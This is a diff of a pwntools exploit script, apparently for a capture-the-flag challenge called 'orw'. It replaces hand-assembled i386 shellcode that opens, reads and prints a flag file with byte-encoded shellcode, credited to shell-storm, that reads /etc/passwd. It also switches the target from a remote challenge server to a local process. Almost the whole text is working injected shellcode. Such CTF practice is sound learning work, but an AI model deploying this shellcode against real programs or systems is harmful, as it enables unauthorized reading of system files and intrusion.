@@ -8,39 +8,27 @@
 
 from pwn import *
 
-p = remote("ctf.racterub.me", 3002)
+# p = remote("ctf.racterub.me", 3002)
+p = process("./orw")
 p.recvuntil(":")
 context.arch = "i386"
 
+# fd = open("/home/orw/flag",0)
+# size = read(fd,buf,0x40)
+# write(1,buf,size)
+# exit()
 
-
-shellcode = asm("""
-        jmp hello
-    write :
-        pop ebx
-        mov eax,5
-        mov ecx,0
-        int 0x80
-
-        mov ebx,eax
-        mov ecx,esp
-        mov edx,0x60
-        mov eax,3
-        int 0x80
-
-        mov edx,eax
-        mov ebx,1
-        mov eax,4
-        int 0x80
-    
-        mov eax,1
-        xor ebx,ebx
-        int 0x80
-    hello :
-        call write
-        .ascii "/flag"
-        .byte 0
-""")
+# Ref: http://shell-storm.org/shellcode/files/shellcode-73.php
+shellcode =  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2"
+shellcode += "\xeb\x32\x5b\xb0\x05\x31\xc9\xcd"
+shellcode += "\x80\x89\xc6\xeb\x06\xb0\x01\x31"
+shellcode += "\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
+shellcode += "\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
+shellcode += "\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
+shellcode += "\x04\xb3\x01\xb2\x01\xcd\x80\x83"
+shellcode += "\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
+shellcode += "\xff"
+shellcode += "/etc/passwd"
 
 p.sendline(shellcode)
-p.interactive()
+
